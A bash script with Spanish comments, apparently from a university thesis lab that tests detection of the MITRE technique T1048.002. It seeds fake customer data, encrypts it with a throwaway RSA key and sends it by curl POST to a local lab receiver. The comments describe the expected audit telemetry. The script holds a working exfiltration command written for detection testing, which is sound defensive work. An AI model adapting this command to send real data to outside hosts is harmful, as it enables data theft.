#!/usr/bin/env bash
# ============================================================================
# ATA041 · T1048.002 Asymmetric Encrypted Non-C2 Protocol — ataque MANUAL (TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1048.002 Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
#           (tactica Exfiltration). Cifrado ASIMETRICO (par de claves efimero)
#           + envio por un protocolo alternativo NO-C2 (HTTP al receptor local).
#           DISTINTO de ATA019/T1048.001 (cifrado SIMETRICO, openssl enc).
# Fuente  : custom (escrito por el TFG; ART trae pruebas Windows/cloud)
# Objetivo: cifrar un fichero de datos simulados con la CLAVE PUBLICA de un par
#           RSA EFIMERO (`openssl genpkey` + `openssl pkeyutl -encrypt`), enviar
#           el blob CIFRADO al receptor del HOST y demostrar el round-trip.
# Destino : http://192.168.65.1:9090/exfil/ATA041 (receptor del HOST, VMnet1)
# Ejecuta : desde /home/angel/lab-attack/ATA041 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST antes de t0 (ver README §9). La prueba de que el dato
#    SALIO es la linea `POST /exfil/ATA041 ... sha256=<H>` del `sink.log`, con <H>
#    == sha256 del blob CIFRADO.
#
# ⚠️ HIGIENE: las claves son EFIMERAS y de JUGUETE (se generan en lab-attack y se
#    pierden al revertir la VM). Cero credenciales reales en el repo.
#
# GUARDARRAILES (abortan si no se cumplen):
#   - el endpoint DEBE ser el receptor del laboratorio (192.168.65.1:9090);
#   - solo se escribe en $HOME/lab-attack/ATA041; datos de juguete.
#
# Telemetria esperada (ver README §5):
#   - execve de openssl (genpkey/pubout/pkeyutl) -> 80792 (deteccion; T1048.002-S1).
#   - execve de curl (envio del blob cifrado)     -> 80792 (deteccion; T1048.002-S2).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA041/*` (T1048.002-S3).
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA041"
PLAIN="${BASE}/extracto_clientes_2026.txt"
PRIV="${BASE}/efimera_priv.pem"
PUB="${BASE}/efimera_pub.pem"
ENC="${BASE}/extracto_clientes_2026.txt.enc"
RTP="${BASE}/roundtrip_verificado.txt"
HOST="192.168.65.1"
PORT="9090"
ENDPOINT="http://${HOST}:${PORT}/exfil/ATA041"

echo "ATA041 · T1048.002 Asymmetric Encrypted Non-C2 (openssl pkeyutl RSA + curl) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
for t in openssl curl sha256sum awk; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "ERROR: $t no disponible" >&2
    exit 1
  fi
done

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el receptor del laboratorio (VMnet1 del host).
case "$ENDPOINT" in
  "http://192.168.65.1:9090/"*) : ;;
  *) echo "ERROR: endpoint '$ENDPOINT' fuera del receptor del laboratorio (abortado)" >&2; exit 1 ;;
esac

# 0) SIEMBRA del dato a exfiltrar (datos de juguete; builtin printf -> sin execve).
#    Tamano < limite RSA-2048 (PKCS#1 v1.5 -> 245 B).
if [ ! -f "$PLAIN" ]; then
  {
    printf 'cliente,nif,segmento,facturacion_eur\n'
    printf 'Acme Iberica,B12345678,empresa,182340.50\n'
    printf 'Mallory Consulting SL,B87654321,empresa,91200.00\n'
    printf 'Logistica Norte SL,B11223344,empresa,45310.75\n'
  } > "$PLAIN"
fi

echo "--- FICHERO ORIGINAL (a cifrar) ---"
sha256sum "$PLAIN"
echo "bytes_original=$(stat -c %s "$PLAIN")"

# 1) PAR DE CLAVES ASIMETRICO EFIMERO (execve de openssl).
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$PRIV" 2>/dev/null
openssl rsa -pubout -in "$PRIV" -out "$PUB" 2>/dev/null

# 2) CIFRADO ASIMETRICO con la CLAVE PUBLICA (execve de openssl).
openssl pkeyutl -encrypt -pubin -inkey "$PUB" -in "$PLAIN" -out "$ENC"

# 3) ENVIO del blob CIFRADO por HTTP al receptor del HOST (execve de curl).
curl --silent --show-error --max-time 10 \
  --request POST \
  --header 'Content-Type: application/octet-stream' \
  --data-binary "@${ENC}" \
  --output /dev/null \
  --write-out 'HTTP=%{http_code} enviado=%{size_upload}B\n' \
  "$ENDPOINT"

# 4) PRUEBA DE EFECTO (local): sha256 del blob CIFRADO realmente enviado.
s_enc=$(sha256sum "$ENC" | awk '{print $1}')

# 5) ROUND-TRIP ASIMETRICO: descifrar con la clave PRIVADA y comprobar el original.
openssl pkeyutl -decrypt -inkey "$PRIV" -in "$ENC" -out "$RTP" 2>/dev/null
s_plain=$(sha256sum "$PLAIN" | awk '{print $1}')
s_rt=$(sha256sum "$RTP" | awk '{print $1}')

echo "--- estado final ---"
ls -l "$PLAIN" "$ENC" "$RTP"
echo "sha256 original        = $s_plain"
echo "sha256 enviado (cifr.) = $s_enc"
echo "sha256 roundtrip       = $s_rt"
if [ -s "$ENC" ] && [ "$s_plain" = "$s_rt" ]; then
  echo "CIFRADO_ASIMETRICO=OK (blob cifrado con RSA enviado por HTTP; roundtrip identico al original)"
else
  echo "CIFRADO_ASIMETRICO=FALLO" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
